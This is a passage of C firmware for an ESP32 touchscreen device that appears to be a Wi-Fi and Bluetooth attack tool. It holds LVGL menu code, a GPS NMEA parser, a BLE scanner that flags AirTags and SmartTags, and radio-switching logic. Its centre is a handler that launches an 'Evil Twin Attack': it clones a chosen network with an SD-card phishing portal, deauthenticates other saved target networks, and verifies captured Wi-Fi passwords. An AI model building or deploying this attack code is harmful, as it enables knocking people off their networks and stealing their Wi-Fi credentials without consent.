        lv_obj_set_scrollbar_mode(ble_scan_list, LV_SCROLLBAR_MODE_AUTO);
        
        // Back button
        lv_obj_t *back_btn = lv_btn_create(function_page);
        lv_obj_set_size(back_btn, lv_pct(100), 45);
        lv_obj_align(back_btn, LV_ALIGN_BOTTOM_MID, 0, 0);
        lv_obj_set_style_bg_color(back_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(back_btn, COLOR_DARK_BLUE, LV_STATE_PRESSED);
        lv_obj_set_style_border_color(back_btn, COLOR_MATERIAL_BLUE, 0);
        lv_obj_set_style_border_width(back_btn, 3, 0);
        lv_obj_t *back_lbl = lv_label_create(back_btn);
        lv_label_set_text(back_lbl, "Back");
        lv_obj_set_style_text_color(back_lbl, COLOR_MATERIAL_BLUE, 0);
        lv_obj_center(back_lbl);
        lv_obj_add_event_cb(back_btn, ble_scan_back_btn_cb, LV_EVENT_CLICKED, NULL);
        
        // Switch to BLE mode
        if (!ensure_ble_mode()) {
            lv_label_set_text(ble_scan_status_label, "BLE init failed!");
            ui_locked = false;
            return;
        }
        
        // Start BLE scan task
        bt_scan_active = true;
        BaseType_t task_ret = xTaskCreate(
            bt_scan_task,
            "bt_scan_task",
            4096,
            NULL,
            5,
            &bt_scan_task_handle
        );
        
        if (task_ret != pdPASS) {
            bt_scan_active = false;
            lv_label_set_text(ble_scan_status_label, "Failed to start scan task!");
        } else {
            lv_label_set_text(ble_scan_status_label, "Scanning... 0 devices (10s)");
        }
        
        ui_locked = false;
        return;
    }

    // Stub screens for not-yet-implemented features
    if (strcmp(attack_name, "Package Monitor") == 0 ||
        strcmp(attack_name, "Channel View") == 0 ||
        strcmp(attack_name, "AirTag scan") == 0 ||
        strcmp(attack_name, "BT Locator") == 0) {
        show_stub_screen(attack_name);
        return;
    }

    // Default: open function page
    show_function_page(attack_name);
}

// Standard stdio behavior restored; no write overrides

// === GPS IMPLEMENTATION ===
static esp_err_t init_gps_uart(void)
{
	uart_config_t uart_config = {
		.baud_rate = 9600,
		.data_bits = UART_DATA_8_BITS,
		.parity = UART_PARITY_DISABLE,
		.stop_bits = UART_STOP_BITS_1,
		.flow_ctrl = UART_HW_FLOWCTRL_DISABLE,
		.source_clk = UART_SCLK_DEFAULT,
	};

	esp_err_t err;
	if ((err = uart_driver_install(GPS_UART_NUM, GPS_BUF_SIZE * 2, 0, 0, NULL, 0)) != ESP_OK) return err;
	if ((err = uart_param_config(GPS_UART_NUM, &uart_config)) != ESP_OK) return err;
	if ((err = uart_set_pin(GPS_UART_NUM, GPS_TX_PIN, GPS_RX_PIN, UART_PIN_NO_CHANGE, UART_PIN_NO_CHANGE)) != ESP_OK) return err;
	return ESP_OK;
}

static bool parse_gps_nmea(const char *nmea_sentence)
{
	if (!nmea_sentence || strlen(nmea_sentence) < 10) return false;
	// Parse GPGGA or GNGGA for fix
	if (strncmp(nmea_sentence, "$GPGGA", 6) == 0 || strncmp(nmea_sentence, "$GNGGA", 6) == 0) {
		char sentence[256];
		strncpy(sentence, nmea_sentence, sizeof(sentence) - 1);
		sentence[sizeof(sentence) - 1] = '\0';

		char *token = strtok(sentence, ",");
		int field = 0;
		float lat_deg = 0, lat_min = 0;
		float lon_deg = 0, lon_min = 0;
		char lat_dir = 'N', lon_dir = 'E';
		int quality = 0;
		float altitude = 0;
		float hdop = 1.0f;

		while (token != NULL) {
			switch (field) {
				case 2: // Latitude DDMM.MMMM
					if (strlen(token) > 4) { lat_deg = (token[0]-'0')*10 + (token[1]-'0'); lat_min = atof(token+2); }
					break;
				case 3: lat_dir = token[0]; break;
				case 4: // Longitude DDDMM.MMMM
					if (strlen(token) > 5) { lon_deg = (token[0]-'0')*100 + (token[1]-'0')*10 + (token[2]-'0'); lon_min = atof(token+3); }
					break;
				case 5: lon_dir = token[0]; break;
				case 6: quality = atoi(token); break;
				case 8: hdop = atof(token); break;
				case 9: altitude = atof(token); break;
			}
			token = strtok(NULL, ",");
			field++;
		}

		if (quality > 0) {
			current_gps.latitude = lat_deg + lat_min / 60.0f;
			if (lat_dir == 'S') current_gps.latitude = -current_gps.latitude;
			current_gps.longitude = lon_deg + lon_min / 60.0f;
			if (lon_dir == 'W') current_gps.longitude = -current_gps.longitude;
			current_gps.altitude = altitude;
			current_gps.accuracy = hdop * 4.0f;
			current_gps.valid = true;
			return true;
		}
	}
	return false;
}

static void gps_task(void *arg)
{
	(void)arg;
	for (;;) {
		int len = uart_read_bytes(GPS_UART_NUM, (uint8_t *)gps_rx_buffer, GPS_BUF_SIZE - 1, pdMS_TO_TICKS(200));
		if (len > 0) {
			gps_rx_buffer[len] = '\0';
			char *line = strtok(gps_rx_buffer, "\r\n");
			while (line != NULL) {
				parse_gps_nmea(line);
				line = strtok(NULL, "\r\n");
			}
		}
		vTaskDelay(pdMS_TO_TICKS(100));
	}
}

static void evil_twin_start_btn_cb(lv_event_t *e)
{
    (void)e;

    if (!evil_twin_network_dd || !evil_twin_html_dd) {
        return;
    }

    if (evil_twin_network_count == 0 || evil_twin_html_count == 0) {
        if (evil_twin_status_label) {
            lv_label_set_text(evil_twin_status_label, "Cannot start: missing selections");
        }
        return;
    }

    int net_sel = lv_dropdown_get_selected(evil_twin_network_dd);
    int html_sel = lv_dropdown_get_selected(evil_twin_html_dd);

    if (net_sel < 0 || net_sel >= evil_twin_network_count ||
        html_sel < 0 || html_sel >= evil_twin_html_count) {
        if (evil_twin_status_label) {
            lv_label_set_text(evil_twin_status_label, "Invalid selection");
        }
        return;
    }

    const uint16_t *count_ptr = wifi_scanner_get_count_ptr();
    uint16_t total_count = count_ptr ? *count_ptr : 0;
    const wifi_ap_record_t *records = wifi_scanner_get_results_ptr();

    int record_index = evil_twin_network_map[net_sel];
    if (!records || record_index < 0 || record_index >= total_count) {
        if (evil_twin_status_label) {
            lv_label_set_text(evil_twin_status_label, "Selected network unavailable");
        }
        return;
    }

    char ssid[33];
    if (records[record_index].ssid[0]) {
        snprintf(ssid, sizeof(ssid), "%s", (const char *)records[record_index].ssid);
    } else {
        snprintf(ssid, sizeof(ssid), "%02X%02X%02X%02X%02X%02X",
                 records[record_index].bssid[0], records[record_index].bssid[1], records[record_index].bssid[2],
                 records[record_index].bssid[3], records[record_index].bssid[4], records[record_index].bssid[5]);
    }

    // Store SSID for event callback
    strncpy(evil_twin_current_ssid, ssid, sizeof(evil_twin_current_ssid) - 1);
    evil_twin_current_ssid[sizeof(evil_twin_current_ssid) - 1] = '\0';

    int html_index = evil_twin_html_map[html_sel];
    const char *html_name = wifi_attacks_get_sd_html_name(html_index);

    // Save target networks before starting attack
    wifi_scanner_save_target_bssids();

    // Get deauth targets for display
    target_bssid_t targets[MAX_TARGET_BSSIDS];
    int target_count = wifi_scanner_get_targets(targets, MAX_TARGET_BSSIDS);

    // Create new UI page
    create_function_page_base("Evil Twin Attack");

    // Create scrollable content container
    lv_obj_t *content = lv_obj_create(function_page);
    lv_obj_set_size(content, lv_pct(100), LCD_V_RES - 30 - 45);  // Leave space for header and Exit button
    lv_obj_align(content, LV_ALIGN_TOP_MID, 0, 30);
    lv_obj_set_style_bg_color(content, lv_color_make(0, 0, 0), 0);
    lv_obj_set_style_border_width(content, 0, 0);
    lv_obj_set_style_pad_all(content, 8, 0);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(content, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START);
    lv_obj_set_style_pad_row(content, 6, 0);

    // Evil Twin network deployed label
    evil_twin_ssid_label = lv_label_create(content);
    char ssid_text[80];
    snprintf(ssid_text, sizeof(ssid_text), "Evil Twin network deployed:\n  %s", ssid);
    lv_label_set_text(evil_twin_ssid_label, ssid_text);
    lv_obj_set_style_text_color(evil_twin_ssid_label, COLOR_MATERIAL_BLUE, 0);
    lv_obj_set_width(evil_twin_ssid_label, lv_pct(100));

    // Other deauthenticated networks label
    lv_obj_t *deauth_header = lv_label_create(content);
    lv_label_set_text(deauth_header, "Other deauthenticated networks:");
    lv_obj_set_style_text_color(deauth_header, COLOR_MATERIAL_BLUE, 0);

    // Build deauth network list
    evil_twin_deauth_list_label = lv_label_create(content);
    lv_obj_set_width(evil_twin_deauth_list_label, lv_pct(100));
    lv_label_set_long_mode(evil_twin_deauth_list_label, LV_LABEL_LONG_WRAP);
    lv_obj_set_style_text_color(evil_twin_deauth_list_label, lv_color_make(180, 180, 180), 0);
    
    static char deauth_list_text[512];
    deauth_list_text[0] = '\0';
    int shown = 0;
    for (int i = 0; i < target_count; i++) {
        // Skip the Evil Twin SSID itself
        if (strcmp(targets[i].ssid, ssid) == 0) {
            continue;
        }
        if (shown > 0) {
            strncat(deauth_list_text, "\n", sizeof(deauth_list_text) - strlen(deauth_list_text) - 1);
        }
        char entry[48];
        if (targets[i].ssid[0]) {
            snprintf(entry, sizeof(entry), "  - %s", targets[i].ssid);
        } else {
            snprintf(entry, sizeof(entry), "  - [Hidden]");
        }
        strncat(deauth_list_text, entry, sizeof(deauth_list_text) - strlen(deauth_list_text) - 1);
        shown++;
    }
    if (shown == 0) {
        strcpy(deauth_list_text, "  (none)");
    }
    lv_label_set_text(evil_twin_deauth_list_label, deauth_list_text);

    // Status header
    lv_obj_t *status_header = lv_label_create(content);
    lv_label_set_text(status_header, "Status:");
    lv_obj_set_style_text_color(status_header, COLOR_MATERIAL_BLUE, 0);

    // Status list (scrollable)
    evil_twin_status_list = lv_list_create(content);
    lv_obj_set_size(evil_twin_status_list, lv_pct(100), 100);
    lv_obj_set_flex_grow(evil_twin_status_list, 1);  // Take remaining space
    lv_obj_set_style_bg_color(evil_twin_status_list, lv_color_make(20, 20, 20), 0);
    lv_obj_set_style_border_color(evil_twin_status_list, COLOR_MATERIAL_BLUE, 0);
    lv_obj_set_style_border_width(evil_twin_status_list, 1, 0);
    lv_obj_set_style_pad_all(evil_twin_status_list, 4, 0);

    // Exit button at the bottom
    lv_obj_t *exit_btn = lv_btn_create(function_page);
    lv_obj_set_size(exit_btn, lv_pct(100), 40);
    lv_obj_align(exit_btn, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(exit_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(exit_btn, COLOR_DARK_BLUE, LV_STATE_PRESSED);
    lv_obj_set_style_border_color(exit_btn, COLOR_MATERIAL_BLUE, 0);
    lv_obj_set_style_border_width(exit_btn, 3, 0);
    lv_obj_add_event_cb(exit_btn, deauth_quit_event_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *exit_label = lv_label_create(exit_btn);
    lv_label_set_text(exit_label, "Exit");
    lv_obj_set_style_text_color(exit_label, COLOR_MATERIAL_BLUE, 0);
    lv_obj_center(exit_label);

    // Create event queue for Evil Twin UI events
    if (!evil_twin_event_queue) {
        evil_twin_event_queue = xQueueCreate(16, sizeof(evil_twin_event_data_t));
    } else {
        xQueueReset(evil_twin_event_queue);
    }

    // Register event callback
    wifi_attacks_set_evil_twin_event_cb(evil_twin_ui_event_callback);

    // Set HTML template
    if (html_name) {
        esp_err_t html_res = wifi_attacks_select_sd_html(html_index);
        if (html_res != ESP_OK) {
            // Add error to status list
            lv_obj_t *item = lv_list_add_text(evil_twin_status_list, "Failed to set portal template");
            lv_obj_set_style_text_color(item, lv_color_make(255, 100, 100), 0);
        }
    }

    // Ensure Karma mode is disabled for Evil Twin (enables WiFi password verification)
    wifi_attacks_set_karma_mode(false);

    // Start the attack
    esp_err_t start_res = wifi_attacks_start_evil_twin(ssid, NULL);
    if (start_res != ESP_OK) {
        lv_obj_t *item = lv_list_add_text(evil_twin_status_list, "Failed to start Evil Twin attack");
        lv_obj_set_style_text_color(item, lv_color_make(255, 100, 100), 0);
        wifi_attacks_set_evil_twin_event_cb(NULL);
        return;
    }

    show_touch_dot = false;
    if (touch_dot) {
        lv_obj_add_flag(touch_dot, LV_OBJ_FLAG_HIDDEN);
    }
}

// ============================================================================
// Radio Mode Switching (WiFi <-> BLE)
// ============================================================================

/**
 * Ensure WiFi mode is active. If BLE is active, deinits BLE first.
 * Returns true if WiFi is ready to use.
 */
static bool ensure_wifi_mode(void)
{
    switch (current_radio_mode) {
        case RADIO_MODE_WIFI:
            // Already in WiFi mode
            return true;
            
        case RADIO_MODE_NONE:
            // Initialize WiFi
            ESP_LOGI(TAG, "Initializing WiFi...");
            esp_err_t ret = wifi_cli_init();
            if (ret != ESP_OK) {
                ESP_LOGE(TAG, "WiFi init failed: %d", ret);
                return false;
            }
            
            // Set WiFi country for extended channels
            wifi_country_t wifi_country = {
                .cc = "PH",
                .schan = 1,
                .nchan = 14,
                .policy = WIFI_COUNTRY_POLICY_AUTO,
            };
            esp_wifi_set_country(&wifi_country);
            
            current_radio_mode = RADIO_MODE_WIFI;
            wifi_initialized = true;
            ESP_LOGI(TAG, "WiFi initialized OK");
            return true;
            
        case RADIO_MODE_BLE:
            // Deinitialize BLE and switch to WiFi
            ESP_LOGI(TAG, "Switching from BLE to WiFi mode...");
            bt_nimble_deinit();
            current_radio_mode = RADIO_MODE_NONE;
            // Now initialize WiFi (recursive call with RADIO_MODE_NONE)
            return ensure_wifi_mode();
    }
    return false;
}

/**
 * Ensure BLE mode is active. If WiFi is active, deinits WiFi first.
 * Returns true if BLE is ready to use.
 */
static bool ensure_ble_mode(void)
{
    switch (current_radio_mode) {
        case RADIO_MODE_BLE:
            // Already in BLE mode
            return true;
            
        case RADIO_MODE_NONE:
            // Initialize BLE
            ESP_LOGI(TAG, "Initializing BLE (NimBLE)...");
            esp_err_t ret = bt_nimble_init();
            if (ret != ESP_OK) {
                ESP_LOGE(TAG, "BLE init failed: %d", ret);
                return false;
            }
            current_radio_mode = RADIO_MODE_BLE;
            ESP_LOGI(TAG, "BLE initialized OK");
            return true;
            
        case RADIO_MODE_WIFI: {
            // Deinitialize WiFi and switch to BLE
            ESP_LOGI(TAG, "Switching from WiFi to BLE mode...");
            esp_wifi_stop();
            esp_wifi_deinit();
            // Only destroy AP netif, keep STA netif for reuse on WiFi re-init
            esp_netif_t *ap_nif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
            if (ap_nif) {
                esp_netif_destroy(ap_nif);
            }
            wifi_initialized = false;
            current_radio_mode = RADIO_MODE_NONE;
            // Now initialize BLE (recursive call with RADIO_MODE_NONE)
            return ensure_ble_mode();
        }
    }
    return false;
}

// ============================================================================
// NimBLE BLE Scanner Functions
// ============================================================================

/**
 * Check if BLE device already found (by MAC address)
 */
static bool bt_is_device_found(const uint8_t *addr)
{
    for (int i = 0; i < bt_found_device_count; i++) {
        if (memcmp(bt_found_devices[i], addr, 6) == 0) {
            return true;
        }
    }
    return false;
}

/**
 * Find device index by MAC address in bt_devices array
 * Returns -1 if not found
 */
static int bt_find_device_index(const uint8_t *addr)
{
    for (int i = 0; i < bt_device_count; i++) {
        if (memcmp(bt_devices[i].addr, addr, 6) == 0) {
            return i;
        }
    }
    return -1;
}

/**
 * Add BLE device to found list
 */
static void bt_add_found_device(const uint8_t *addr)
{
    if (bt_found_device_count < BT_MAX_DEVICES) {
        memcpy(bt_found_devices[bt_found_device_count], addr, 6);
        bt_found_device_count++;
    }
}

/**
 * Reset BLE scan counters
 */
static void bt_reset_counters(void)
{
    bt_airtag_count = 0;
    bt_smarttag_count = 0;
    bt_found_device_count = 0;
    bt_device_count = 0;
    memset(bt_found_devices, 0, sizeof(bt_found_devices));
    memset(bt_devices, 0, sizeof(bt_devices));
}

/**
 * Format BLE MAC address to string
 */
static void bt_format_addr(const uint8_t *addr, char *str)
{
    sprintf(str, "%02X:%02X:%02X:%02X:%02X:%02X",
            addr[5], addr[4], addr[3], addr[2], addr[1], addr[0]);
}

/**
 * Check if manufacturer data indicates Apple AirTag/Find My device
 */
static bool bt_is_apple_airtag(const uint8_t *data, uint8_t len, bool has_name)
{
    if (len < 4) return false;
    
    // Check Company ID (Little Endian: 0x4C 0x00)
    uint16_t company_id = data[0] | (data[1] << 8);
    if (company_id != APPLE_COMPANY_ID) return false;
    
    // Check Find My device type (0x12)
    if (data[2] != APPLE_FIND_MY_TYPE) return false;
    
    // AirTags typically have 25-29 bytes of manufacturer data
    // and don't broadcast a device name (unlike iPhone/iPad)
    if (len >= 25 && len <= 29 && !has_name) {
        return true;
    }
    
    return false;
}

/**
 * Check if manufacturer data indicates Samsung SmartTag
 */
static bool bt_is_samsung_smarttag(const uint8_t *data, uint8_t len)
{
    if (len < 4) return false;
    
    // Check Company ID (Little Endian: 0x75 0x00)
    uint16_t company_id = data[0] | (data[1] << 8);
    if (company_id != SAMSUNG_COMPANY_ID) return false;
    
    // SmartTag uses SmartThings Find protocol
    uint8_t device_type = data[2];
    
    // SmartTag typical payload length is 22-28 bytes
    if ((device_type == 0x02 || device_type == 0x03) && len >= 20 && len <= 30) {
        return true;
    }
    
    return false;
}

/**
 * BLE GAP event callback for scanning
 */
static int bt_gap_event_callback(struct ble_gap_event *event, void *arg)
{
    if (event->type != BLE_GAP_EVENT_DISC) {
        return 0;
    }
    
    struct ble_gap_disc_desc *desc = &event->disc;
    
    // Parse advertising data
    struct ble_hs_adv_fields fields;
    int rc = ble_hs_adv_parse_fields(&fields, desc->data, desc->length_data);
    if (rc != 0) {
        return 0;
    }
    
    // Check if this is a Scan Response packet (contains names more often)
    bool is_scan_response = (desc->event_type == BLE_HCI_ADV_RPT_EVTYPE_SCAN_RSP);
    
    // Check if device already seen
    bool already_seen = bt_is_device_found(desc->addr.val);
    
    // If already seen, only process scan responses to update names
    if (already_seen) {
        // Try to update name from scan response if we don't have one
        if (is_scan_response && fields.name != NULL && fields.name_len > 0) {
            int dev_idx = bt_find_device_index(desc->addr.val);
            if (dev_idx >= 0 && bt_devices[dev_idx].name[0] == '\0') {
                int name_len = fields.name_len < 31 ? fields.name_len : 31;
                memcpy(bt_devices[dev_idx].name, fields.name, name_len);
                bt_devices[dev_idx].name[name_len] = '\0';
            }
        }
        return 0;
    }
    
    // Add to found devices list
    bt_add_found_device(desc->addr.val);
    
    // Store device info
    if (bt_device_count < BT_MAX_DEVICES) {
        bt_device_info_t *dev = &bt_devices[bt_device_count];
        memcpy(dev->addr, desc->addr.val, 6);
        dev->rssi = desc->rssi;
        dev->name[0] = '\0';
        dev->company_id = 0;
        dev->is_airtag = false;
        dev->is_smarttag = false;
        
        // Extract device name if available
        bool has_name = (fields.name != NULL && fields.name_len > 0);
        if (has_name) {
            int name_len = fields.name_len < 31 ? fields.name_len : 31;
            memcpy(dev->name, fields.name, name_len);
            dev->name[name_len] = '\0';
        }
        
        // Check manufacturer data
        if (fields.mfg_data != NULL && fields.mfg_data_len >= 2) {
            dev->company_id = fields.mfg_data[0] | (fields.mfg_data[1] << 8);
            
            if (bt_is_apple_airtag(fields.mfg_data, fields.mfg_data_len, has_name)) {
                dev->is_airtag = true;
                bt_airtag_count++;
            }
            else if (bt_is_samsung_smarttag(fields.mfg_data, fields.mfg_data_len)) {
                dev->is_smarttag = true;
                bt_smarttag_count++;
            }
        }
        
        bt_device_count++;
    }
    
    return 0;
}

/**
 * Start BLE scanning
 */
static int bt_start_scan(void)
{
    struct ble_gap_disc_params scan_params = {
        .itvl = 0x60,             // 60ms interval
        .window = 0x60,           // 60ms window = continuous listening
        .filter_policy = BLE_HCI_SCAN_FILT_NO_WL,
        .limited = 0,
        .passive = 0,             // ACTIVE scan - critical for Scan Response names
        .filter_duplicates = 0,   // We handle duplicates ourselves
    };
    
    int rc = ble_gap_disc(BLE_OWN_ADDR_PUBLIC, BLE_HS_FOREVER, &scan_params,
                          bt_gap_event_callback, NULL);
    return rc;
}

/**
 * Stop BLE scanning
 */
static void bt_stop_scan(void)
{
    ble_gap_disc_cancel();
}

/**
 * NimBLE host sync callback
 */
static void bt_on_sync(void)
{
    ESP_LOGI(TAG, "BLE Host synchronized");
    nimble_initialized = true;
}

/**
 * NimBLE host reset callback
 */
static void bt_on_reset(int reason)
{
    ESP_LOGE(TAG, "BLE Host reset, reason: %d", reason);
    nimble_initialized = false;
}

/**
 * NimBLE host task
 */
static void nimble_host_task(void *param)
{
    ESP_LOGI(TAG, "NimBLE host task started");
    nimble_port_run();
    nimble_port_freertos_deinit();
}

/**
 * Initialize NimBLE stack
 */
static esp_err_t bt_nimble_init(void)
{
    if (nimble_initialized) {
        return ESP_OK;
    }
    
    esp_err_t ret = nimble_port_init();
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "NimBLE port init failed: %d", ret);
        return ret;
    }
    
    // Configure BLE host callbacks
    ble_hs_cfg.sync_cb = bt_on_sync;
    ble_hs_cfg.reset_cb = bt_on_reset;
    
    // Start NimBLE host task
    nimble_port_freertos_init(nimble_host_task);
    
    // Wait for sync (max 3 seconds)
    for (int i = 0; i < 30 && !nimble_initialized; i++) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    if (!nimble_initialized) {
        ESP_LOGE(TAG, "NimBLE failed to sync");
        return ESP_FAIL;
    }
    
    return ESP_OK;
}

/**
 * Deinitialize NimBLE stack
 */
static void bt_nimble_deinit(void)
{
    if (!nimble_initialized) {
        return;
    }
    
    // Stop any active scanning
    bt_scan_active = false;
    bt_stop_scan();
    
    // Wait for scan task to finish
    if (bt_scan_task_handle != NULL) {
        for (int i = 0; i < 20 && bt_scan_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(100));
        }
    }
    
    // Stop NimBLE host task
    nimble_port_stop();
    vTaskDelay(pdMS_TO_TICKS(100));
    
    // Deinitialize NimBLE port
    nimble_port_deinit();
    
    nimble_initialized = false;
    ESP_LOGI(TAG, "NimBLE stopped");
}

/**
 * Stop BLE scanner
 */
static void bt_scan_stop(void)
{
    if (!bt_scan_active && bt_scan_task_handle == NULL) {
        return;
    }
    
    bt_scan_active = false;
    bt_stop_scan();
    
    // Wait for task to finish
    for (int i = 0; i < 40 && bt_scan_task_handle != NULL; i++) {
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    
    if (bt_scan_task_handle != NULL) {
        vTaskDelete(bt_scan_task_handle);
        bt_scan_task_handle = NULL;
    }
    
    ESP_LOGI(TAG, "BLE scanner stopped.");
}

/**
 * Update BLE scan list UI with current results
 */
static void ble_scan_update_list(void)
{
    if (!ble_scan_list) return;
    
    // Clear existing items
    lv_obj_clean(ble_scan_list);
    
    for (int i = 0; i < bt_device_count; i++) {
        bt_device_info_t *dev = &bt_devices[i];
        char addr_str[18];
        bt_format_addr(dev->addr, addr_str);
        
        char item_text[80];
        const char *type_str = "";
        if (dev->is_airtag) {
            type_str = " AirTag";
        } else if (dev->is_smarttag) {
            type_str = " SmartTag";
        }
        
        if (dev->name[0] != '\0') {
            // Truncate name if too long
            char short_name[13];
            strncpy(short_name, dev->name, 12);
            short_name[12] = '\0';
            snprintf(item_text, sizeof(item_text), "%d %s%s %s", 
                     dev->rssi, short_name, type_str, addr_str);
        } else {
            snprintf(item_text, sizeof(item_text), "%d%s %s", 
                     dev->rssi, type_str, addr_str);
        }
        
        lv_obj_t *item = lv_label_create(ble_scan_list);
        lv_label_set_text(item, item_text);
        lv_obj_set_width(item, lv_pct(100));
        lv_obj_set_style_text_color(item, COLOR_MATERIAL_BLUE, 0);
        lv_obj_set_style_text_font(item, &lv_font_montserrat_12, 0);  // Smaller font to fit more
        lv_obj_set_style_pad_ver(item, 1, 0);
        lv_label_set_long_mode(item, LV_LABEL_LONG_SCROLL_CIRCULAR);  // Scroll if too long
    }
}

/**
 * BLE scan task - runs for 10 seconds then stops
 */
static void bt_scan_task(void *pvParameters)
{
    bt_reset_counters();
    ble_scan_finished = false;
    
    ESP_LOGI(TAG, "BLE scan starting (10 seconds)...");
    
    int rc = bt_start_scan();
    if (rc != 0) {
        ESP_LOGE(TAG, "BLE scan start failed: %d", rc);
        bt_scan_active = false;
        bt_scan_task_handle = NULL;
        
        // Set status for UI update (thread-safe)
        snprintf(ble_scan_status_text, sizeof(ble_scan_status_text), "Scan failed!");
        ble_scan_needs_ui_update = true;
        
        vTaskDelete(NULL);
        return;
    }
    
    // Scan for 10 seconds, updating UI every 500ms via flag
    for (int i = 0; i < 100 && bt_scan_active; i++) {
        vTaskDelay(pdMS_TO_TICKS(100));
        
        // Update UI every 500ms via flag (thread-safe)
        if (i % 5 == 0) {
            snprintf(ble_scan_status_text, sizeof(ble_scan_status_text), 
                     "Scanning... %d (%ds)", bt_device_count, (100 - i) / 10);
            ble_scan_needs_ui_update = true;
        }
    }
    
    bt_stop_scan();
    bt_scan_active = false;
    
    // Final UI update via flag (thread-safe)
    snprintf(ble_scan_status_text, sizeof(ble_scan_status_text), 
             "%d devices (%d AT, %d ST)", bt_device_count, bt_airtag_count, bt_smarttag_count);
    ble_scan_finished = true;
    ble_scan_needs_ui_update = true;
    
    ESP_LOGI(TAG, "BLE scan complete: %d devices found", bt_device_count);
    
    bt_scan_task_handle = NULL;
    vTaskDelete(NULL);
}

/**
 * BLE Scan Back button callback
 */
static void ble_scan_back_btn_cb(lv_event_t *e)
{
    // Stop scan if running (waits for task to finish)
    bt_scan_stop();
    
    // Clean up UI
    ble_scan_ui_active = false;
    ble_scan_list = NULL;
    ble_scan_status_label = NULL;
    ble_scan_content = NULL;
    
    // Switch back to WiFi mode
    if (current_radio_mode == RADIO_MODE_BLE) {
        bt_nimble_deinit();
        current_radio_mode = RADIO_MODE_NONE;
    }
    
    // Return to menu
    nav_to_menu_flag = true;
}
